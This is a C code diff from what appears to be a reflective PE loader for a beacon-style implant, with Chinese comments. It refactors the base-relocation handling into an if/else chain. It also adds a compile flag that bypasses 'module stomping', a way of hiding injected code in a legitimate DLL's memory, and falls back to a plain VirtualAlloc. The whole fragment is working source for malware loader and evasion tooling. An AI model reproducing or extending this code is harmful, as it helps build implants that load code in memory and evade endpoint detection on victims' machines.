@@ -617,25 +617,25 @@ static BOOL RefApplyRelocations(PBYTE imageBase, PIMAGE_NT_HEADERS nt, ULONG_PTR
             WORD offset = reloc[i] & 0x0fff;
             PBYTE patch = imageBase + block->VirtualAddress + offset;
 
-            switch (type) {
-            case IMAGE_REL_BASED_ABSOLUTE:
-                break;
+            if (type == IMAGE_REL_BASED_ABSOLUTE) {
+                /* no-op */
+            }
 #if defined(_WIN64)
-            case IMAGE_REL_BASED_DIR64:
+            else if (type == IMAGE_REL_BASED_DIR64) {
                 *(ULONGLONG*)patch += (ULONGLONG)delta;
-                break;
+            }
 #else
-            case IMAGE_REL_BASED_HIGHLOW:
+            else if (type == IMAGE_REL_BASED_HIGHLOW) {
                 *(DWORD*)patch += (DWORD)delta;
-                break;
+            }
 #endif
-            case IMAGE_REL_BASED_HIGH:
+            else if (type == IMAGE_REL_BASED_HIGH) {
                 *(WORD*)patch += HIWORD(delta);
-                break;
-            case IMAGE_REL_BASED_LOW:
+            }
+            else if (type == IMAGE_REL_BASED_LOW) {
                 *(WORD*)patch += LOWORD(delta);
-                break;
-            default:
+            }
+            else {
                 return FALSE;
             }
         }
@@ -818,6 +818,9 @@ static VOID RefRegisterExceptionTable(PBYTE imageBase, PIMAGE_NT_HEADERS nt, REF
  */
 static PVOID RefModuleStomping(REF_API_TABLE* api, SIZE_T size)
 {
+#if defined(BEACON_REFLECTIVE_NO_STOMP)
+    return api->VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+#else
     HMODULE hModule = NULL;
     PVOID pvBuffer = NULL;
     DWORD oldProtect = 0;
@@ -863,6 +866,7 @@ static PVOID RefModuleStomping(REF_API_TABLE* api, SIZE_T size)
     /* 回退：直接 VirtualAlloc */
     pvBuffer = api->VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     return pvBuffer;
+#endif
 }
 
 /* ===== 反射加载主入口 ===== */
